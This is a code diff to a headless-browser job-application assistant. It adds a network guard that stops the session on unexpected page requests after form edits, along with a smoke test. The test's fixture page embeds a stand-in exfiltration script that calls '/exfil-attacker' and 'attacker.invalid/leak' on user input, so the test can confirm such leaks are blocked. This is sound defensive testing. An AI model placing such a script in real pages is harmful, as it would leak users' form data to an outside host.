@@ -418,6 +418,17 @@ function validateOtherRequest(value) {
   const route = routeIdentityForUrl(value);
   return Boolean(route && documentRouteIdentity && sameDocumentRoute(route, documentRouteIdentity));
 }
+function isBrowserChromeFaviconRequest(targetPage, request, parsed, method, type) {
+  if (!parsed || method !== 'GET' || type !== 'other' || request.isNavigationRequest()
+      || parsed.username || parsed.password || parsed.hash || parsed.search
+      || parsed.pathname !== '/favicon.ico' || rawPathFromUrl(request.url()) !== '/favicon.ico'
+      || request.postData() != null || (request.redirectChain?.().length || 0) !== 0) return false;
+  const current = safeUrl(targetPage.url());
+  if (!current || current.origin !== parsed.origin) return false;
+  const initiator = typeof request.initiator === 'function' ? request.initiator() : null;
+  return initiator?.type === 'other';
+}
+
 function routeIdentityForUrl(value) {
   try { return documentRouteKey(validateInitialUrl(value)); } catch { return null; }
 }
@@ -682,7 +693,6 @@ async function startProxy() {
     if ((!permitAllowed && (proxyFrozen || firstApplicantMutation || terminalReason))
         || (!permitAllowed && !preMutationAllowed)
         || (!permitAllowed && method !== 'GET' && method !== 'HEAD')) {
-      if (firstApplicantMutation && !terminalReason && !permitAllowed) terminalReason = 'unsafe_network_attempt';
       res.writeHead(403); res.end(); return;
     }
     if (!permitAllowed && method !== 'GET' && method !== 'HEAD') { res.writeHead(403); res.end(); return; }
@@ -799,7 +809,6 @@ async function startProxy() {
       && (normalizedAuthority === localAuthority.toLowerCase() || normalizedAuthority === logicalAuthority.toLowerCase()));
     const initialAuthorization = currentConnectAuthorization(authority, host, localTunnel, localParsed, parsed);
     if (client.destroyed || !initialAuthorization.allowed) {
-      if (firstApplicantMutation && !terminalReason && !initialAuthorization.reviewAllowed) terminalReason = 'unsafe_network_attempt';
       client.destroy(); return;
     }
     const destinationPort = localTunnel ? Number(localParsed.port || 443) : 443;
@@ -922,6 +931,52 @@ function installBudgetWatcher() {
   }, 1000);
   budgetTimer.unref?.();
 }
+function isImplicitBrowserFaviconIntent(targetPage, params) {
+  const request = params?.request;
+  const parsed = safeUrl(request?.url);
+  const current = safeUrl(targetPage.url());
+  const documentUrl = safeUrl(params?.documentURL);
+  return Boolean(
+    parsed && current
+    && request?.method === 'GET'
+    && params?.type === 'Other'
+    && params?.initiator?.type === 'other'
+    && request?.hasPostData !== true
+    && !request?.postData
+    && !parsed.username && !parsed.password && !parsed.hash && !parsed.search
+    && parsed.pathname === '/favicon.ico'
+    && rawPathFromUrl(request.url) === '/favicon.ico'
+    && current.origin === parsed.origin
+    && (!documentUrl || documentUrl.origin === parsed.origin)
+  );
+}
+
+function recordUnsafePageNetworkIntent(reason = 'unsafe_network_attempt') {
+  networkRequestSequence += 1;
+  lastNetworkActivity = Date.now();
+  if (terminalReason) return;
+  terminalReason = reason;
+  setTimeout(() => { if (!cleanupStarted) void close(); }, 1000).unref?.();
+}
+
+async function installPageNetworkIntentGuard(targetPage) {
+  const client = await targetPage.createCDPSession();
+  await client.send('Network.enable');
+  client.on('Network.requestWillBeSent', params => {
+    if (!firstApplicantMutation || reviewState === 'open_guarded'
+        || isImplicitBrowserFaviconIntent(targetPage, params)) return;
+    let reason = 'unsafe_network_attempt';
+    if (params?.type === 'Document') {
+      try { validateDocumentNavigation(params?.request?.url); }
+      catch (error) { reason = error?.message || 'unsafe_navigation_target'; }
+    }
+    recordUnsafePageNetworkIntent(reason);
+  });
+  client.on('Network.webSocketCreated', () => {
+    if (firstApplicantMutation && reviewState !== 'open_guarded') recordUnsafePageNetworkIntent();
+  });
+}
+
 async function launch(command = {}) {
   if (browser) return;
   launchHeadless = command.headless !== false;
@@ -993,6 +1048,7 @@ async function launch(command = {}) {
   page.on('framenavigated', frame => {
     if (currentGeneration && reviewState !== 'open_guarded') invalidateGeneration('navigation_invalidated');
   });
+  await installPageNetworkIntentGuard(page);
   await installRequestGuards(page);
   installBudgetWatcher();
 }
@@ -1050,7 +1106,6 @@ async function installRequestGuards(targetPage) {
     lastNetworkActivity = Date.now();
   };
   targetPage.on('request', async request => {
-    markStart(request);
     const url = request.url(); const parsed = safeUrl(url);
     const host = parsed ? parsed.hostname.toLowerCase() : '';
     const local = isLocalHost(host); const method = String(request.method() || 'GET').toUpperCase();
@@ -1058,6 +1113,12 @@ async function installRequestGuards(targetPage) {
     if (finalLike) networkCounters.finalLikeDenied += 1;
     const type = request.resourceType();
     const navigation = type === 'document' && request.isNavigationRequest();
+    if (isBrowserChromeFaviconRequest(targetPage, request, parsed, method, type)) {
+      networkCounters.denied += 1;
+      await request.abort('blockedbyclient').catch(() => {});
+      return;
+    }
+    markStart(request);
     if (navigation && reviewState !== 'open_guarded' && currentGeneration) invalidateGeneration('navigation_invalidated');
     const redirectChain = typeof request.redirectChain === 'function' ? request.redirectChain() : [];
     const redirectExceeded = redirectChain.length > MAX_REDIRECTS;
@@ -1492,6 +1553,7 @@ async function scanVisibleBlockers(frame) {
 }
 async function observe() {
   assertPage();
+  await settle();
   for (const entry of handleCache.values()) await entry.handle.dispose().catch(() => {});
   handleCache = new Map();
   reviewLedger = new Map();
@@ -1745,6 +1807,7 @@ function stageImmutableUpload(root, candidate, expectedHash) {
   }
 }
 async function action(command) {
+  if (command.action === 'click') await waitForInitialQuiet(command.quietTimeoutMs || 10000);
   const { selected, live, frame, frameChain } = await consumeTarget(command);
   try {
     if (live.isButton) return await buttonAction(selected, live, command, frame, frameChain);
@@ -1821,7 +1884,6 @@ async function buttonAction(handle, info, command, frame, observedFrameChain) {
   }
   const beforeUrl = page.url();
   const beforeFrameUrl = frame?.url?.() || info.documentOrigin;
-  const beforeNetworkSequence = networkRequestSequence;
   const frameChain = Array.isArray(observedFrameChain) ? observedFrameChain : frameAncestry(frame);
   const hit = await handle.evaluate(el => {
     const rect = el.getBoundingClientRect();
@@ -1833,6 +1895,8 @@ async function buttonAction(handle, info, command, frame, observedFrameChain) {
     return top === el || Boolean(top && el.contains(top));
   }).catch(() => false);
   if (!hit) throw new Error('button_not_hit_tested');
+  if (pendingNetwork !== 0) throw new Error('page_not_stable');
+  const beforeNetworkSequence = networkRequestSequence;
   beginMutation();
   await handle.evaluate(el => {
     const click = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'click')?.value;
@@ -2252,11 +2316,49 @@ function enqueue(command) {
 
 async function runSmoke() {
   const smokeToken = crypto.randomBytes(16).toString('hex');
+  const smokeRunRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'jobs-assistant-smoke-run-'));
+  const originalCwd = process.cwd();
   process.env.JOBS_ASSISTANT_INTERNAL_TRANSPORT_TOKEN = smokeToken;
   let attackerHttpRequests = 0;
-  const server = http.createServer((req, res) => { if (/attacker|exfil/i.test(req.url || '') || isFinalLike(req.url || '')) { attackerHttpRequests += 1; res.statusCode = 500; res.end('blocked'); return; } res.setHeader('content-type', 'text/html'); res.end('<!doctype html><form><label>First Name <input name="first_name" required></label><button type="submit">Submit Application</button><button type="button" id="offline">Continue</button><script>window.addEventListener("input",()=>{fetch("/exfil-attacker").catch(()=>{});const image=new Image();image.src="http://attacker.invalid/leak"});</script></form>'); });
+  const server = http.createServer((req, res) => {
+    if (/attacker|exfil/i.test(req.url || '') || isFinalLike(req.url || '')) {
+      attackerHttpRequests += 1;
+      res.statusCode = 500;
+      res.end('blocked');
+      return;
+    }
+    res.setHeader('content-type', 'text/html');
+    res.end('<!doctype html><form><label>First Name <input name="first_name" required></label><button type="submit">Submit Application</button><button type="button" id="offline">Continue</button><script>window.addEventListener("input",()=>{fetch("/exfil-attacker").catch(()=>{});const image=new Image();image.src="http://attacker.invalid/leak"});</script></form>');
+  });
+  process.chdir(smokeRunRoot);
   await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
-  try { await preflight(); await launch({ headless: true }); internalTransportUrl = `http://127.0.0.1:${server.address().port}/fixture`; await goto({ url: 'https://boards.greenhouse.io/fixture/jobs/123', internal_url: internalTransportUrl, internal_token: smokeToken }); const observed = await observe(); const field = observed.fields.find(item => item.name === 'first_name'); if (!field) throw new Error('smoke_field_missing'); if (!observed.final_submit_target_ids.length) throw new Error('smoke_final_marker_missing'); await action({ action: 'fill', target_id: field.target_id, value: 'Ada' }); await settle(); const counters = { ...networkCounters, attackerHttpRequests }; if (counters.attackerDnsLookups !== 0 || counters.attackerHttpRequests !== 0) throw new Error('smoke_attacker_counter_nonzero'); await close(); await send({ smoke: true, counters, cleanup: !userDataDir }); } finally { server.close(); await close(); }
+  try {
+    await preflight();
+    await launch({ headless: true });
+    internalTransportUrl = `http://127.0.0.1:${server.address().port}/fixture`;
+    await goto({
+      url: 'https://boards.greenhouse.io/fixture/jobs/123',
+      internal_url: internalTransportUrl,
+      internal_token: smokeToken,
+    });
+    const observed = await observe();
+    const field = observed.fields.find(item => item.name === 'first_name');
+    if (!field) throw new Error('smoke_field_missing');
+    if (!observed.final_submit_target_ids.length) throw new Error('smoke_final_marker_missing');
+    await action({ action: 'fill', target_id: field.target_id, value: 'Ada' });
+    await settle();
+    const counters = { ...networkCounters, attackerHttpRequests };
+    if (counters.attackerDnsLookups !== 0 || counters.attackerHttpRequests !== 0) {
+      throw new Error('smoke_attacker_counter_nonzero');
+    }
+    await close();
+    await send({ smoke: true, counters, cleanup: !userDataDir });
+  } finally {
+    server.close();
+    await close();
+    process.chdir(originalCwd);
+    fs.rmSync(smokeRunRoot, { recursive: true, force: true });
+  }
 }
 
 async function runErrorCodeSelfTest() {
